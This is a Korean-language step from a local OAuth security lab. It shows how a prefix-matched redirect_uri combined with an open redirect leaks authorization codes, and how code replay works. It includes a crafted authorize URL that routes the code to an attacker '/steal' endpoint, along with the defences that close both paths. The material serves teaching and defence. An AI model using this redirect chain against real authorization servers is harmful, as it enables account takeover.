# 스텝 4 — 공격 #2: code 가로채기, 그리고 redirect_uri / 1회용 code

state(스텝 3)는 "내가 시작한 로그인인가"만 막는다. **code 자체가 새는 것**은 못 막는다.
스텝 4는 code 가 새는 두 경로를 닫는다.

## A. redirect_uri 완전 일치

### 앱의 흔한 실수 (항상 켜둠)
앱 `/callback` 은 "로그인 후 원래 페이지로" 를 위해 `?next=` 로 302 한다. 값 검증이 없어 open redirect 다.
이 자체로는 앱 버그지만, 인가서버가 redirect_uri 를 느슨하게 검증하면 **code 유출 경로**가 완성된다.

### 공격 (`./lab off redirect`)
공격자가 피해자에게 authorize 링크를 보낸다:
```
http://127.0.0.1:9000/authorize?...&redirect_uri=http://127.0.0.1:9002/callback?next=http://127.0.0.1:9003/steal
```
- 피해자가 **자기 계정**으로 로그인·동의한다 (스텝 3과 반대 방향!)
- 인가서버는 prefix 매칭이라 이 redirect_uri 를 통과시킨다
- code 가 `/callback?next=.../steal` 로 배달되고, 앱이 next 로 302 → **code 가 공격자(:9003/steal)로**
- 공격자가 그 code 를 `/token` 으로 바꾸면 **피해자 계정 탈취**

### 방어 (`./lab on redirect`)
인가서버가 등록값과 **문자열 완전 일치**만 허용한다.
`.../callback?next=...` 는 등록값 `.../callback` 과 다르므로 `400`. 앱의 open redirect 가 있어도 애초에 진행이 안 된다.

```
[ON ] redirect_uri=.../callback?next=x → 400
[OFF] 같은 요청                          → 200 (prefix 통과)
```

## B. code 1회용 + 재사용 감지

### 공격 (`./lab off onetime`)
같은 code 로 `/token` 을 두 번:
```
1차 → access_token
2차 → access_token   ← 둘 다 발급. code 가 새면 공격자가 무한히 토큰을 찍는다
```
(스텝 1~2에서 본 그 문제)

### 방어 (`./lab on onetime`)
- code 수명 60초, **1회용**
- **재사용 감지 시 그 code 로 이미 나간 토큰까지 폐기** (재사용 = 탈취 신호)

```
1차 → access_token (T1)
2차 → invalid_grant (재사용 감지)
T1 으로 /notes → 401   ← 앱이 받았던 정상 토큰도 함께 죽는다
```

마지막 줄이 중요하다. "공격자가 두 번째로 썼으니 두 번째만 막으면 되지" 가 아니다.
누가 진짜 주인인지 알 수 없으니 **둘 다 폐기**하고 다시 로그인하게 만든다.

## 컨트롤러

```bash
./lab status              # 방어 3개 상태 한눈에
./lab off redirect        # 재시작 불필요
./lab on  redirect
```

## 코드에서 볼 곳

| 무엇 | 어디 |
|---|---|
| redirect_uri 검증 (prefix ↔ exact) | `cmd/authserver/main.go` `handleAuthorize` |
| code 1회용 + 재사용시 폐기 | `cmd/authserver/main.go` `grantAuthorizationCode` |
| 토큰 폐기 | `internal/store/store.go` `RevokeTokensFromCode` |
| 앱의 open redirect (흔한 실수) | `cmd/client/main.go` `handleCallback` `next` |
| code 탈취 수집 | `cmd/attacker/main.go` `/steal` |

## 내가 채울 칸

- redirect_uri 를 exact match 하면, 앱의 open redirect 버그가 남아 있어도 왜 안전한가? →
- code 재사용 시 "두 번째 요청만" 거부하고 첫 토큰은 살려두면 뭐가 문제인가? →
- state 는 있는데 redirect_uri 검증이 느슨하면 스텝 4 공격이 막히나? (둘은 다른 층위) →
